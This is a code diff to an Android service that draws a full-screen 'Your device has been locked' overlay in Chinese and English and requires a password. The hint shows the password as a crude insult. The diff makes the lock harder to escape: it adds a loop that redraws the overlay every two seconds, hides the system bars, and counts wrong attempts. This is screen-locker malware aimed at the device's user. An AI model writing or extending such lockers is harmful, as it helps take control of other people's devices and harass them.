@@ -6,11 +6,8 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.ServiceInfo;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
-import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.GradientDrawable;
 import android.os.Build;
 import android.os.Handler;
@@ -25,10 +22,8 @@ import android.view.WindowManager;
 import android.view.inputmethod.EditorInfo;
 import android.widget.EditText;
 import android.widget.FrameLayout;
-import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import android.widget.Toast;
 
 public class LockScreenService extends Service {
     private static final String CHANNEL_ID = "lock_screen_channel";
@@ -36,6 +31,9 @@ public class LockScreenService extends Service {
 
     private WindowManager windowManager;
     private View lockView;
+    private TextView errorText;
+    private int errorCount;
+    private final Handler handler = new Handler(Looper.getMainLooper());
 
     @Override
     public void onCreate() {
@@ -47,6 +45,7 @@ public class LockScreenService extends Service {
             startForeground(1, buildNotification());
         }
         showLockScreen();
+        startAutoLockWatch();
     }
 
     @Override
@@ -59,8 +58,21 @@ public class LockScreenService extends Service {
 
     @Override
     public void onDestroy() {
+        handler.removeCallbacksAndMessages(null);
         removeLockScreen();
         super.onDestroy();
+    }
+
+    private void startAutoLockWatch() {
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (hasOverlayPermission() && lockView == null) {
+                    showLockScreen();
+                }
+                handler.postDelayed(this, 2000);
+            }
+        }, 2000);
     }
 
     @Override
@@ -78,6 +90,15 @@ public class LockScreenService extends Service {
         }
         try {
             lockView = createLockView();
+            // Hide status bar + nav bar
+            lockView.setSystemUiVisibility(
+                    View.SYSTEM_UI_FLAG_FULLSCREEN
+                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
+
             WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.MATCH_PARENT,
@@ -86,7 +107,8 @@ public class LockScreenService extends Service {
                             : WindowManager.LayoutParams.TYPE_PHONE,
                     WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                             | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-                            | WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                            | WindowManager.LayoutParams.FLAG_FULLSCREEN
+                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                     PixelFormat.TRANSLUCENT);
             params.gravity = Gravity.TOP | Gravity.START;
             params.x = 0;
@@ -101,34 +123,34 @@ public class LockScreenService extends Service {
         FrameLayout root = new FrameLayout(this);
         root.setBackgroundColor(Color.BLACK);
 
-        // Background image (app icon)
-        ImageView bgImage = new ImageView(this);
-        try {
-            Bitmap bmp = BitmapFactory.decodeResource(getResources(), R.drawable.app_icon);
-            if (bmp != null) {
-                bgImage.setImageBitmap(bmp);
-                bgImage.setScaleType(ImageView.ScaleType.CENTER_INSIDE);
-                bgImage.setAlpha(0.3f);
-            }
-        } catch (Exception ignored) {}
-        root.addView(bgImage, new FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.MATCH_PARENT));
-
         // Content
         LinearLayout content = new LinearLayout(this);
         content.setOrientation(LinearLayout.VERTICAL);
         content.setGravity(Gravity.CENTER);
         content.setPadding(dp(32), 0, dp(32), 0);
 
-        // Title
-        TextView title = new TextView(this);
-        title.setText("你的设备已经被锁定");
-        title.setTextColor(Color.RED);
-        title.setTextSize(28);
-        title.setGravity(Gravity.CENTER);
-        title.setShadowLayer(4, 0, 0, Color.BLACK);
-        content.addView(title, new LinearLayout.LayoutParams(
+        // Title - Chinese
+        TextView titleCN = new TextView(this);
+        titleCN.setText("你的设备已经被锁定");
+        titleCN.setTextColor(Color.RED);
+        titleCN.setTextSize(28);
+        titleCN.setGravity(Gravity.CENTER);
+        titleCN.setShadowLayer(4, 0, 0, Color.BLACK);
+        content.addView(titleCN, new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT));
+
+        // Spacer
+        addSpacer(content, dp(6));
+
+        // Title - English
+        TextView titleEN = new TextView(this);
+        titleEN.setText("Your device has been locked");
+        titleEN.setTextColor(Color.RED);
+        titleEN.setTextSize(20);
+        titleEN.setGravity(Gravity.CENTER);
+        titleEN.setShadowLayer(3, 0, 0, Color.BLACK);
+        content.addView(titleEN, new LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT));
 
@@ -137,7 +159,7 @@ public class LockScreenService extends Service {
 
         // Password input
         EditText input = new EditText(this);
-        input.setHint("请输入密码");
+        input.setHint("请输入密码 / Enter password");
         input.setHintTextColor(Color.GRAY);
         input.setTextColor(Color.WHITE);
         input.setTextSize(20);
@@ -160,9 +182,22 @@ public class LockScreenService extends Service {
         // Spacer
         addSpacer(content, dp(12));
 
+        // Error text (hidden by default)
+        errorText = new TextView(this);
+        errorText.setTextColor(Color.RED);
+        errorText.setTextSize(16);
+        errorText.setGravity(Gravity.CENTER);
+        errorText.setVisibility(View.GONE);
+        content.addView(errorText, new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.WRAP_CONTENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT));
+
+        // Spacer
+        addSpacer(content, dp(8));
+
         // Hint text
         TextView hint = new TextView(this);
-        hint.setText("密码是i m sb");
+        hint.setText("密码是 i m sb");
         hint.setTextColor(Color.parseColor("#FF6666"));
         hint.setTextSize(14);
         hint.setGravity(Gravity.CENTER);
@@ -179,10 +214,20 @@ public class LockScreenService extends Service {
 
     private void checkPassword(EditText input) {
         if (PASSWORD.equals(input.getText().toString().trim())) {
-            Toast.makeText(this, "密码正确，解除锁定", Toast.LENGTH_SHORT).show();
-            new Handler(Looper.getMainLooper()).postDelayed(this::unlock, 500);
+            if (errorText != null) {
+                errorText.setText("Password correct! Unlocking...");
+                errorText.setTextColor(Color.GREEN);
+                errorText.setVisibility(View.VISIBLE);
+            }
+            new Handler(Looper.getMainLooper()).postDelayed(this::unlock, 800);
         } else {
-            Toast.makeText(this, "密码错误", Toast.LENGTH_SHORT).show();
+            errorCount++;
+            if (errorText != null) {
+                errorText.setText("密码错误! Wrong password! (" + errorCount + ")");
+                errorText.setTextColor(Color.RED);
+                errorText.setVisibility(View.VISIBLE);
+            }
+            input.setText("");
         }
     }
 
